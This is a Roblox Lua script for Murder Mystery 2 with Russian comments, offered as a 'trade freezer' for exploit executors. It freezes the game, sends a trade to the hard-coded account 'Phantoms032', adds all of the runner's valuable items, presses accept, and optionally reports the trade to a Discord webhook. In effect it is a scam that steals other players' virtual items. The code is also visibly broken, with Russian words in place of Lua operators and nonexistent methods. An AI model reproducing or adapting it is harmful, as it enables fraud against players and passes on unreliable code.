-- [[ MURDER MYSTERY 2 – ТРЕЙД-ФРИЗЕР + АВТО-ТРЕЙД НА PHANTOMS032 ]] --
-- РАБОТАЕТ ТОЛЬКО В ЭКСПЛОЙТАХ С ПОДДЕРЖКОЙ HTTP, GUI И МЫШИ (SYNAPSE, KRNL, SCRIPTWARE)

local targetPlayer = "Phantoms032" -- Игрок, на которого отправляем трейд
local webhookForLogs = "https://discord.com/api/webhooks/ВАШ_ВЕБХУК" -- Опционально для логов

-- ======= ФУНКЦИЯ ФРИЗА (ЗАВИСАНИЕ) =======
local function freezeGame()
    -- Бесконечный цикл, который грузит процессор, но не блокирует поток полностью
    game:GetService("RunService").RenderStepped:Connect(function()
        -- Ничего не делаем, просто ждём каждый кадр
    end)
    -- Дополнительно можно заспавнить бесконечный цикл для нагрузки
    spawn(function()
        while true do
            wait(0.001)
        end
    end)
    print("[FREEZE] Игра зависла, но скрипт продолжает работу в фоне.")
end

-- ======= ФУНКЦИЯ ОТПРАВКИ ТРЕЙДА =======
local function sendTrade()
    local player = game.Players.LocalPlayer
    local target = game.Players:FindFirstChild(targetPlayer)
    if not target then
        warn("[ERROR] Игрок " .. targetPlayer .. " не найден в игре!")
        return
    end

    -- Открываем окно трейда (обычно через клик по имени в чате или списке)
    -- Имитируем нажатие на игрока в списке (если есть)
    local playerList = game:GetService("Players"):FindFirstChild("PlayerList")
    if playerList then
        for _, v in pairs(playerList:GetDescendants()) do
            if v:IsA("TextLabel") and v.Text == target.Name then
                -- Симулируем клик
                v:FireClick() или v:TriggerEvent("MouseButton1Click") -- зависит от эксплойта
                break
            end
        end
    end

    -- Ожидаем появления GUI трейда (можно использовать FindFirstChild с таймаутом)
    local tradeGui = nil
    for i = 1, 30 do
        tradeGui = player.PlayerGui:FindFirstChild("TradeGui") -- или другое название
        if tradeGui then break end
        wait(0.5)
    end
    if not tradeGui then
        warn("[ERROR] Окно трейда не открылось.")
        return
    end

    -- ======= ДОБАВЛЯЕМ ВСЕ ЦЕННЫЕ ПРЕДМЕТЫ =======
    -- В MM2 инвентарь обычно хранится в ReplicatedStorage или в локальных данных
    -- Попробуем получить список предметов через RemoteEvent
    local inventory = {}
    -- Пример: предметы в игре могут быть в папке "Inventory" внутри игрока
    local inventoryFolder = player:FindFirstChild("Inventory") или game:GetService("ReplicatedStorage"):FindFirstChild("Inventory")
    if inventoryFolder then
        for _, item in pairs(inventoryFolder:GetChildren()) do
            if item:IsA("Tool") или item:IsA("Model") then
                table.insert(inventory, item)
            end
        end
    else
        -- Альтернатива: если есть Remote для получения инвентаря, вызываем его
        local remote = game:GetService("ReplicatedStorage"):FindFirstChild("GetInventory")
        if remote then
            remote:InvokeServer() -- может вернуть таблицу
        end
    end

    -- Теперь добавляем каждый предмет в трейд (нажимаем кнопку "Add")
    for _, item in pairs(inventory) do
        -- Ищем кнопку добавления предмета с именем предмета
        local itemButton = tradeGui:FindFirstChild(item.Name) или tradeGui:FindFirstChild("ItemButton", true)
        if itemButton and itemButton:IsA("TextButton") then
            -- Симулируем клик для добавления
            itemButton:FireClick()
            wait(0.1)
        end
    end

    -- ======= НАЖИМАЕМ "ГОТОВО" (ACCEPT) =======
    local acceptButton = tradeGui:FindFirstChild("AcceptButton") или tradeGui:FindFirstChild("ReadyButton")
    if acceptButton then
        acceptButton:FireClick()
        print("[TRADE] Нажата кнопка 'Готово'. Ожидаем подтверждения от " .. targetPlayer)
    else
        warn("[ERROR] Кнопка 'Готово' не найдена.")
    end

    -- ======= ОТПРАВКА ЛОГА (ОПЦИОНАЛЬНО) =======
    if webhookForLogs ~= "" then
        local http = game:GetService("HttpService")
        local data = {
            content = "Трейд отправлен от " .. player.Name .. " на " .. targetPlayer .. " с " .. #inventory .. " предметами."
        }
        local json = http:JSONEncode(data)
        pcall(function()
            http:PostAsync(webhookForLogs, json, Enum.HttpContentType.ApplicationJson)
        end)
    end
end

-- ======= ЗАПУСК =======
print("[START] Запуск скрипта...")

-- Запускаем фриз и одновременно трейд в отдельном потоке
freezeGame()

-- Ждём немного, чтобы игра успела зависнуть, затем стартуем трейд
task.wait(2) -- Даём время на фриз

local success, err = pcall(sendTrade)
if not success then
    warn("[ERROR] Ошибка в sendTrade: " .. tostring(err))
else
    print("[SUCCESS] Трейд отправлен. Теперь зайди за Phantoms032 и прими его.")
end

-- Бесконечное ожидание, чтобы скрипт не завершился (трейд должен быть активен)
while true do
    wait(10)
end
